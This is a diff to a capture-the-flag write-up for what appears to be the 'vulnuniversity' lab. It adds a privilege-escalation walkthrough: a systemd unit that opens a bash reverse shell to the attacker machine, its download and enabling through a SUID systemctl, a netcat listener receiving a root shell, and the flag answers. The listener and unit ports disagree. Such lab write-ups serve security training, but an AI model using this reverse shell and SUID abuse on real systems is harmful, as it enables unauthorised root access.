@@ -83,6 +83,7 @@ $ ls -la /home/bill
 -rw-r--r-- 1 bill bill   33 Jul 31  2019 user.txt
 $ cat /home/bill/user.txt
 8bd7992fbe8a6ad22a63361004cfcedb
+```
 > *Answer*: 8bd7992fbe8a6ad22a63361004cfcedb
 
 # Privilege Escalation
@@ -121,3 +122,34 @@ $ find / -perm -u=s -type f | grep -v "Permission denied"
 > *Answer*: /bin/systemctl
 
 Become root and get the last flag (/root/root.txt)
+```
+/var/www/html/root.service
+[Unit]
+Description=PrivEsc
+
+[Service]
+Type=simple
+User=root
+ExecStart=/bin/bash -c 'bash -i >& /dev/tcp/ip_address_of_my_attackbox/9999 0>&1'
+
+[Install]
+wantedBy=multi-user.target
+# systemctl restart apache2
+$ cd /tmp
+$ wget <kali ip>/root.service
+...
+2021-09-19 04:09:25 (32.9 MB/s) - 'root.service' saved [175/175]
+$ /bin/systemctl enable /tmp/root.service
+Created symlink from /etc/systemd/system/root.service to /tmp/root.service.
+$ /bin/systemctl start root.service
+# nc -lvnp 8888
+listening on [any] 8888 ...
+connect to [10.8.241.141] from (UNKNOWN) [10.10.117.6] 57870
+bash: cannot set terminal process group (2040): Inappropriate ioctl for device
+bash: no job control in this shell
+root@vulnuniversity:/# cat /root/root.txt
+a58ff8579f0a9270368d33a9966c7fd5
+```
+> *Answer*: a58ff8579f0a9270368d33a9966c7fd5
+
+
